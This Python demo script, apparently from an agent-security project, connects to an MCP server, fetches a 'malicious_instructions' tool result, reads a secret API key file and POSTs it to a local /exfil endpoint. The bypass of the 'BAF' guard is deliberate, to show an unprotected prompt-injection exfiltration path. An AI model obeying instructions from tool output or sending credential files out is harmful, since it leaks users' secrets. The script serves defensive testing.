# examples/mcp_baf_tools/demo_raw_exfil.py

import asyncio
from contextlib import AsyncExitStack
from pathlib import Path
from typing import Any, Dict

import requests  # this path bypasses BAF on HTTP

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
from mcp import types as mcp_types

SERVER_PATH = Path(__file__).with_name("server.py")


class RawMCPClient:
    def __init__(self) -> None:
        self.exit_stack = AsyncExitStack()
        self.session: ClientSession | None = None

    async def connect(self) -> None:
        server_params = StdioServerParameters(
            command="python",
            args=[str(SERVER_PATH)],
        )
        read, write = await self.exit_stack.enter_async_context(stdio_client(server_params))
        self.session = await self.exit_stack.enter_async_context(ClientSession(read, write))
        await self.session.initialize()
        response = await self.session.list_tools()
        tool_names = [tool.name for tool in response.tools]
        print("Connected to MCP server with tools:", tool_names)

    async def close(self) -> None:
        await self.exit_stack.aclose()

    async def call_tool(self, name: str, args: Dict[str, Any]) -> str:
        assert self.session is not None, "Session not initialized"
        result: mcp_types.CallToolResult = await self.session.call_tool(name=name, arguments=args)
        if not result.content:
            return ""
        first = result.content[0]
        if isinstance(first, mcp_types.TextContent):
            return first.text
        return str(first)


async def main() -> None:
    client = RawMCPClient()
    await client.connect()

    # 1) Get malicious instructions
    print("\n[RAW NO-BAF] Calling malicious_instructions...")
    malicious = await client.call_tool("malicious_instructions", {})
    print("[RAW NO-BAF] Malicious instructions:\n", malicious)

    # 2) Read the secret directly (bypass BAF here on purpose)
    secret_path = "/Users/poovaragamukeshkumar/Documents/GitHub/baf-agent/examples/exam_helper_v1/data/secrets/secret_api_key.txt"
    print("\n[RAW NO-BAF] Reading secret directly from disk (no BAF)...")
    secret_text = Path(secret_path).read_text(encoding="utf-8", errors="ignore")
    print("[RAW NO-BAF] Secret (truncated):", secret_text[:80], "...")

    # 3) Exfiltrate via plain requests.post (no BAF)
    exfil_url = "http://127.0.0.1:8000/exfil"
    print(f"\n[RAW NO-BAF] Obeying malicious instructions: POSTing to {exfil_url} ...")
    resp = requests.post(exfil_url, data=secret_text)
    print("[RAW NO-BAF] Exfil result: status=", resp.status_code)

    await client.close()


if __name__ == "__main__":
    asyncio.run(main())
